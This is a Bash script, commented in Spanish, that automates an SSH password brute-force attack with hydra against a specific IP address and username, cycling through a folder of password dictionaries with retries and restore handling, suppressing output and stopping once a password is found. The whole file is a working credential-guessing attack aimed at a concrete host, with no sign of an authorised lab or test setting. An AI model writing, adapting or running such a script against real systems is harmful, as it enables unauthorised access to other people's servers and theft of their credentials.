#!/bin/bash

# Configuración
USER="criptolocos"
HOST="13.59.153.168"
PORT=22
DICT_FOLDER="filtrados"
OUTPUT="hydra_results.txt"
TASKS=4
RESTORE_FILE="hydra.restore"

# Colores
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "Iniciando ataque..."

for dic in "$DICT_FOLDER"/filtrado*.txt; do
    echo -e "${YELLOW}Procesando: $(basename "$dic")${NC}"
    
    # Ejecutar hydra con reintentos
    retry_count=0
    max_retries=3
    success=false
    
    while [[ $retry_count -lt $max_retries && $success == false ]]; do
        if [[ $retry_count -gt 0 ]]; then
            echo "Reintentando... (intento $((retry_count + 1))/$max_retries)"
        fi
        
        if [[ -f $RESTORE_FILE ]]; then
            hydra -l "$USER" -P "$dic" ssh://$HOST:$PORT -t $TASKS -o "$OUTPUT" -R -q -I > /dev/null 2>&1
            exit_code=$?
        else
            hydra -l "$USER" -P "$dic" ssh://$HOST:$PORT -t $TASKS -o "$OUTPUT" -f -q -I > /dev/null 2>&1
            exit_code=$?
        fi
        
        # Si hydra terminó exitosamente o encontró credenciales
        if [[ $exit_code -eq 0 ]] || grep -q "login:" "$OUTPUT" 2>/dev/null; then
            success=true
            if grep -q "login:" "$OUTPUT" 2>/dev/null; then
                echo -e "${GREEN}¡ÉXITO! Contraseña encontrada en $(basename "$dic")${NC}"
                echo -e "${GREEN}Resultado guardado en: $OUTPUT${NC}"
                exit 0  # Salir completamente del script
            else
                echo "Sin éxito con $(basename "$dic")"
            fi
        else
            ((retry_count++))
            if [[ $retry_count -lt $max_retries ]]; then
                sleep 5
            fi
        fi
    done
    
    if [[ $success == false ]]; then
        echo -e "${RED}Error: Falló después de $max_retries intentos con $(basename "$dic")${NC}"
    fi
    
    # Limpiar restore file
    [[ -f $RESTORE_FILE ]] && rm -f "$RESTORE_FILE"
    
    sleep 2
done

echo "Proceso completado."

